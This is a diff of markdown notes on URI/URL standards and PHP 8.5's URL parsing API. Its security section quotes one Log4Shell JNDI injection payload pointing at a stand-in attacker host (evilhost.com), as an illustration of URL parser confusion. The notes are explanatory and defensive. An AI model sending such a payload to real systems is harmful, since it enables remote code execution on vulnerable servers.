@@ -1,9 +1,20 @@
-# Intro
+# Introduction
 
 URIs and URLs are one of the most fundamental concepts of the web because they make it possible to reference specific resources on a network. 
 
-* RFC 3986 (URL + URI): Followed by web browsers.
-* [WHATWG URL](https://url.spec.whatwg.org/#title)
+* RFC 3986 (URL + URI)
+* [WHATWG URL](https://url.spec.whatwg.org/#title): Followed by web browsers.
+
+## PHP URL Parsing API
+
+Was [introduced in PHP 8.5](https://wiki.php.net/rfc/url_parsing_api). An RFC 3986 and WHATWG URL compliant API.
+
+* Parsing URI has a high complexity.
+* Security concerns.
+    * Read [Dont mix parsers](https://daniel.haxx.se/blog/2022/01/10/dont-mix-url-parsers/).
+    * Remember Log4j and Log4Shell (CVE-2021-44228)
+        * `jndi:ldap://127.0.0.1#.evilhost.com:1389/a` (Java Naming and Directory Interface)
+    * Security white paper [EXPLOITING URL PARSERS: THE GOOD, BAD, AND INCONSISTENT ](https://web-assets.claroty.com/exploiting-url-parsing-confusion.pdf)
 
 ## URIs, IRIs, URLs, URNs
 
@@ -15,21 +26,8 @@ URIs and URLs are one of the most fundamental concepts of the web because they m
 <img src="images/iri_venn_diagramm.svg" alt="URL Parsing API" width="600">
 The image is reused from https://wiki.selfhtml.org/wiki/URN.
 
-## URI Parsing API
-            
-Introduced in PHP 8.5.
-
-An RFC 3986 and WHATWG URL compliant API. WHATWG uses Lexbor.
-
-* High complexity.
-* Security concerns.
-    * [Dont mix parsers](https://daniel.haxx.se/blog/2022/01/10/dont-mix-url-parsers/).
-    * Remember Log4j
-        * `jndi:ldap://127.0.0.1#.evilhost.com:1389/a`
-    * Security white paper [EXPLOITING URL PARSERS: THE GOOD, BAD, AND INCONSISTENT ](https://web-assets.claroty.com/exploiting-url-parsing-confusion.pdf)
-
 ### WHATWG
-This is what is followed by web browsers.
+A [living standard](https://url.spec.whatwg.org/#title), this is what is followed by web browsers to pare the URL.
 
 * Lexbor - Added to PHP 8.4
 * PHP uses Lexbor, written in C. https://lexbor.com/
